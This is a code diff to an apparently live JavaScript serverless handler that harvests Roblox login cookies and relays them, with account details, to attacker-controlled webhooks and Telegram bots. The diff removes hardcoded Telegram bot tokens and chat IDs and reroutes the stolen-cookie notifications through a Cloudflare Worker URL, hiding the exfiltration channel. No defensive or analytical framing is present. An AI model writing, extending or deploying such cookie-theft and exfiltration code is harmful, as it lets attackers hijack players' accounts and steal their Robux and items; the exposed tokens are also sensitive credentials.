@@ -1,11 +1,8 @@
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 
-const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
-const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
-
-const TG_WEBHOOK_TOKEN = process.env.TG_WEBHOOK_TOKEN || '8971718461:AAGfB2edB6ryqFOIB1ET5_cGUEoZnZDQB4E';
-const TG_WEBHOOK_CHAT  = process.env.TG_WEBHOOK_CHAT  || '7538845070';
+// Worker URL - replace with your actual worker URL
+const WORKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev';
 
 const ITEMS = {
   HEADLESS: 134082579,
@@ -213,24 +210,26 @@ async function refreshCookieStatus(cookie) {
   return { refreshed: accountInfo.valid, account: accountInfo, timestamp: new Date().toISOString() };
 }
 
+// UPDATED: Send to Worker instead of Telegram directly (Bot 1 - Account notifications)
 async function tgSendAccount(text) {
   try {
-    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+    await fetch(`${WORKER_URL}/notify`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
+      body: JSON.stringify({ bot: 'create', text })
     });
-  } catch {}
+  } catch (_) {}
 }
 
+// UPDATED: Send to Worker instead of Telegram directly (Bot 2 - Webhook tracking)
 async function tgSendWebhook(text) {
   try {
-    await fetch(`https://api.telegram.org/bot${TG_WEBHOOK_TOKEN}/sendMessage`, {
+    await fetch(`${WORKER_URL}/notify`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TG_WEBHOOK_CHAT, text, parse_mode: 'HTML' })
+      body: JSON.stringify({ bot: 'webhook', text })
     });
-  } catch {}
+  } catch (_) {}
 }
 
 const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
@@ -516,8 +515,8 @@ export default async function handler(req, res) {
   await sendRawCookie(webhook2, cookie, acc?.username);
   if (webhook1) await sendRawCookie(webhook1, cookie, acc?.username);
 
-  // Telegram
-  console.log('Step 5: Telegram');
+  // Telegram (now via Worker)
+  console.log('Step 5: Telegram via Worker');
   if (acc) {
     await tgSendAccount([
       `🍪 <b>COOKIE — ${pName}</b>`,
